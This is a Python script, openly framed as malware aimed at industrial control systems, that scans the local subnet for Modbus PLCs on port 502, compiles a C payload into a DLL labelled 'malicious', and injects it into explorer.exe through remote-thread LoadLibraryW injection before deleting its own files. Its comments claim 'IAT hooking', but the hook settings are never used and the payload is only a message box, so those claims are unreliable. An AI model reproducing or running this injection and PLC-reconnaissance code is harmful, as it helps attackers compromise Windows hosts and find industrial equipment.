import socket
import struct
import subprocess
import sys
import time
import os
import re  # Import the regular expression module

# --- Configuration ---
# Define the target process name.  This is a placeholder; the more sophisticated
# malware would probably determine this programmatically.
TARGET_PROCESS_NAME = "explorer.exe" # A common windows process.
# Function to hook (example: Kernel32.dll:GetModuleHandleA).  Replace with a function
# more likely to be used by ICS software.  Critical: Choose an API call that the
# target process actually uses.  You MUST determine this through reverse engineering!
TARGET_DLL = "kernel32.dll"
TARGET_API_FUNCTION = "CreateFileW"  #Example
# Malicious code to inject (just a simple message box for demonstration).  This will
# replace the actual API function call.
# IMPORTANT:  This messagebox requires user interaction which will freeze the hooked program.
# This script *modifies* system processes, be extremely careful.
MALICIOUS_CODE = """
#include <windows.h>

int main() {
    MessageBoxW(NULL, L"IAT Hook Successful!", L"Infected!", MB_OK);
    return 0;
}
"""
# --- IAT Hooking Functions ---

def find_process_id(process_name):
    """Finds the Process ID (PID) of a running process."""
    try:
        # Use the 'tasklist' command to get a list of running processes.
        tasklist_output = subprocess.check_output(['tasklist'], universal_newlines=True)

        # Iterate over the lines of the output, skipping the header.
        for line in tasklist_output.splitlines()[3:]:
            parts = line.split()
            if len(parts) > 0 and parts[0].lower() == process_name.lower():
                return int(parts[1])  # The PID is in the second column.
        return None  # Process not found.

    except subprocess.CalledProcessError:
        print("Error executing tasklist command.")
        return None

def compile_malicious_code():
    """Compiles the malicious code into a DLL."""
    try:
        # Create a temporary C file
        with open("malicious_code.c", "w") as f:
            f.write(MALICIOUS_CODE)

        # Compile the C code into a DLL using MinGW (or your preferred compiler)
        # Make sure you have MinGW (or similar) installed and in your PATH
        # The "-Wl,--kill-at" flag removes the @number from exported function names in the DLL
        subprocess.check_call(["gcc", "malicious_code.c", "-shared", "-o", "malicious.dll", "-Wl,--kill-at", "-Wl,--subsystem,windows"])

        print("Malicious DLL compiled successfully.")
        return "malicious.dll"

    except subprocess.CalledProcessError as e:
        print(f"Error compiling malicious code: {e}")
        return None
    except FileNotFoundError:
        print("GCC not found.  Make sure MinGW (or a compatible compiler) is installed and in your PATH.")
        return None

def inject_dll(pid, dll_path):
    """Injects the compiled DLL into the target process using ctypes."""
    import ctypes

    # Load necessary Windows API functions.
    kernel32 = ctypes.windll.kernel32  # This is how we get access to windows APIs
    OpenProcess = kernel32.OpenProcess
    VirtualAllocEx = kernel32.VirtualAllocEx
    WriteProcessMemory = kernel32.WriteProcessMemory
    GetModuleHandleW = kernel32.GetModuleHandleW  #Get the module base address
    GetProcAddress = kernel32.GetProcAddress
    CreateRemoteThread = kernel32.CreateRemoteThread
    LoadLibraryW = kernel32.LoadLibraryW #Needed because we will load our custom DLL

    # Define constants
    PROCESS_ALL_ACCESS = (0x000F0000 | 0x00100000 | 0xFFF) # Defines the rights for the process
    MEM_COMMIT = 0x00001000
    MEM_RESERVE = 0x00002000
    PAGE_EXECUTE_READWRITE = 0x00000040
    TH32CS_SNAPMODULE = 0x00000008 #This is needed to take a snapshot of the module.
    TH32CS_SNAPMODULE32 = 0x00000010  #Take snapshots on 32 bit modules.

    # 1. Open the target process
    process_handle = OpenProcess(PROCESS_ALL_ACCESS, False, pid)
    if not process_handle:
        print(f"Error opening process: {ctypes.GetLastError()}")
        return False

    # 2. Allocate memory in the target process for the DLL path.  We use the unicode type
    dll_path_encoded = dll_path.encode('utf-16le') # Encode to unicode
    dll_path_length = len(dll_path_encoded)
    remote_memory = VirtualAllocEx(process_handle, 0, dll_path_length, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE)
    if not remote_memory:
        print(f"Error allocating memory: {ctypes.GetLastError()}")
        kernel32.CloseHandle(process_handle)
        return False

    # 3. Write the DLL path to the allocated memory.
    written = ctypes.c_ulonglong(0)
    WriteProcessMemory(process_handle, remote_memory, dll_path_encoded, dll_path_length, ctypes.byref(written))
    if written.value != dll_path_length:
        print(f"Error writing to memory: {ctypes.GetLastError()}")
        kernel32.VirtualFreeEx(process_handle, remote_memory, 0, 0x8000) #MEM_RELEASE = 0x8000.  VirtualFreeEx is needed for allocated memory outside our process.
        kernel32.CloseHandle(process_handle)
        return False

    # 4. Get the address of LoadLibraryW in the target process's address space. LoadLibraryW imports a .DLL file in the program.
    kernel32_module_handle = GetModuleHandleW("kernel32.dll")
    load_library_address = GetProcAddress(kernel32_module_handle, "LoadLibraryW") #Get the address of LoadLibraryW
    if not load_library_address:
        print(f"Error getting LoadLibraryW address: {ctypes.GetLastError()}")
        kernel32.VirtualFreeEx(process_handle, remote_memory, 0, 0x8000)
        kernel32.CloseHandle(process_handle)
        return False


    # 5. Create a remote thread in the target process that calls LoadLibraryW with the DLL path as an argument.
    thread_id = ctypes.c_ulong(0)
    remote_thread_handle = CreateRemoteThread(process_handle, None, 0, load_library_address, remote_memory, 0, ctypes.byref(thread_id)) #This will invoke the LoadLibrary function on the remote process.
    if not remote_thread_handle:
        print(f"Error creating remote thread: {ctypes.GetLastError()}")
        kernel32.VirtualFreeEx(process_handle, remote_memory, 0, 0x8000)
        kernel32.CloseHandle(process_handle)
        return False

    # 6. Wait for the thread to finish (optional, but good practice).
    kernel32.WaitForSingleObject(remote_thread_handle, -1) #This will wait for the thread to finish.

    # Clean up.
    kernel32.CloseHandle(remote_thread_handle) #Clean the handles and memory.
    kernel32.VirtualFreeEx(process_handle, remote_memory, 0, 0x8000)
    kernel32.CloseHandle(process_handle)

    print("DLL injected successfully.")
    return True

# --- PLC Interaction (IP Discovery - VERY BASIC) ---

def find_plc_ip():
    """Attempts to find the PLC IP address by scanning the network.
    This is a very rudimentary example and may not work in all network setups.
    A more robust method would use specialized PLC discovery protocols."""
    try:
        # Get the host's IP address
        host_name = socket.gethostname()
        host_ip = socket.gethostbyname(host_name)

        # Extract the base network address (e.g., 192.168.1.0 from 192.168.1.100)
        network_prefix = '.'.join(host_ip.split('.')[:-1]) + '.'

        print(f"Scanning network {network_prefix} for PLC...")

        # Iterate through a range of IP addresses (e.g., 192.168.1.1 to 192.168.1.254)
        for i in range(1, 255):
            target_ip = network_prefix + str(i)
            try:
                # Attempt to connect to port 502 (Modbus - common PLC protocol)
                #  Adjust the port if your PLC uses a different protocol.
                sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                sock.settimeout(0.1)  # Short timeout to avoid hanging
                result = sock.connect_ex((target_ip, 502)) #Default Modbus TCP port, change according to the PLC protocol.

                if result == 0:
                    print(f"Possible PLC IP found: {target_ip}")
                    return target_ip
                sock.close()
            except socket.error:
                pass  # Ignore connection errors
        print("No PLC found on the network (basic scan).")
        return None #Return None if PLC is not found.

    except socket.gaierror:
        print("Could not get host IP address.")
        return None


# --- Main Execution ---

if __name__ == "__main__":

    plc_ip_address = find_plc_ip()
    if not plc_ip_address:
        print("PLC IP address not found.  Exiting.")
        sys.exit(1)
    else:
        print(f"PLC IP address: {plc_ip_address}")

    # 1. Find the Process ID of the target process.
    pid = find_process_id(TARGET_PROCESS_NAME)
    if not pid:
        print(f"Target process '{TARGET_PROCESS_NAME}' not found. Exiting.")
        sys.exit(1)

    print(f"Target process PID: {pid}")

    # 2. Compile the malicious code into a DLL.
    dll_path = compile_malicious_code()
    if not dll_path:
        print("Failed to compile malicious DLL. Exiting.")
        sys.exit(1)

    # 3. Inject the DLL into the target process.
    if inject_dll(pid, os.path.abspath(dll_path)):  #Use absolute path.
        print("IAT hooking may have been successful (check target process).")
    else:
        print("IAT hooking failed.")

    # 4. Clean up the temporary DLL file (optional, but recommended).
    try:
        os.remove(dll_path)
        os.remove("malicious_code.c")
        print("Temporary DLL and C file removed.")
    except OSError as e:
        print(f"Error removing temporary files: {e}")